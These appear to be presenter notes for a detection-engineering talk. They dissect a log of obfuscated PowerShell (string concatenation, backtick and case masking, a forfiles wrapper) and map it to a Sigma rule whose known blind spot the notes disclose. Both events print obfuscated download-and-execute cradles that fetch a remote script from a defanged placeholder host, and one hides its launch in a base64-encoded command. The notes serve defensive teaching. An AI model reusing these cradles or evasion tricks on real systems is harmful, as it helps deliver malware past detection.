# Analyst notes — `02-character-masking-backtick-case.log`

**Do not reveal until after the room has had a chance to read the raw log and
guess the pattern.** Paired live-demo raw log: `02-character-masking-backtick-case.log`.
Sigma rule this maps to: `../sigma-rules/sigma-t1027010-character-masking.yml`.
("Because Hammond did" — the community nod referenced on Slide 7 of the deck.)

Event 1 (ScriptBlockId `1fc7d4d6-...`):
```
$ProgressPreference='SilentlyContinue';$c=('p'+'o'+'w'+'e'+'r'+'s'+'h'+'e'+'l'+'l');& ("I`E`X") ((New-Object Net.WebClient).DownloadString('hxxp[://]cdn-sync-relay[.]test/lib/stage3-PLACEHOLDER.ps1'))
```
- String concatenation: `'p'+'o'+'w'+'e'+'r'+'s'+'h'+'e'+'l'+'l'` builds the
  literal "powershell" without the substring ever appearing contiguously.
- Backtick splitting: `"I`E`X"` — PowerShell's escape character (`) inserted
  between each letter of IEX. The parser strips the backticks and executes
  `IEX` normally; a substring match for the literal token "IEX" fails, but
  Script Block Logging captures the resolved call anyway (the "iex" hit is
  absent from source text but the *behavior* still is IEX — this is why
  the Sigma rule in this kit matches on `I`E`X`, `I`EX`, `IE`X` variants,
  not just the plain string).

Event 2 (ScriptBlockId `f090aef5-...`), ~126ms later:
```
fOrfIlEs /p C:\Windows\System32\WindowsPowerShell\v1.0 /m "p"o"w"e"r"s"h"e"l"l".exe /c "cM`D /c p`O`w`ers`H`ell -nop -w hidden -enc <base64, decoded below>"
```
- `forfiles.exe` (a signed Windows LOLBIN, not PowerShell) is used to
  launch the actual PowerShell process — a wrapper technique documented in
  STEEP#MAVERICK that keeps the second interpreter invocation out of a
  parent-is-powershell.exe detection.
- Case randomization stacked on top: `fOrfIlEs`, `p`O`w`ers`H`ell` — mixed
  upper/lower case defeats exact-case string signatures while remaining
  valid Windows command syntax (cmd.exe and PowerShell are both
  case-insensitive for command/cmdlet names).
- Quote-splitting of the literal filename mask `"p"o"w"e"r"s"h"e"l"l".exe`
  is the exact `forfiles /m` masking shape reported in STEEP#MAVERICK,
  reconstructed here with the wildcard/mask target renamed for clarity.
- The `-enc` payload is a real base64-encoded, UTF-16LE PowerShell command.
  It decodes to:
  ```
  IEX (New-Object Net.WebClient).DownloadString('hxxp[://]cdn-sync-relay[.]test/lib/stage3-PLACEHOLDER.ps1')
  ```
  included so the encoded-download-cradle pattern is demonstrable
  end-to-end, but the URL is defanged, points at a reserved `.test` domain,
  and does not resolve.

**Known limitation of the shipped Sigma rule (flag if asked in Q&A):** the
rule's `selection_forfiles_shell_proxy` clause fires on this block via the
literal, unobfuscated substring "PowerShell" inside the *path*
(`...\WindowsPowerShell\v1.0\...`), not by defeating the quote-split masking
of the word "powershell" that appears later in the same line. Against a
variant of this technique where the interpreter path itself is also
wildcard/env-var-masked (no plaintext "powershell" anywhere on the command
line), this specific clause would not fire on the quote-split target alone —
worth calling out live if a detection engineer in the room asks how robust
the rule really is, rather than letting it pass as fully solved.
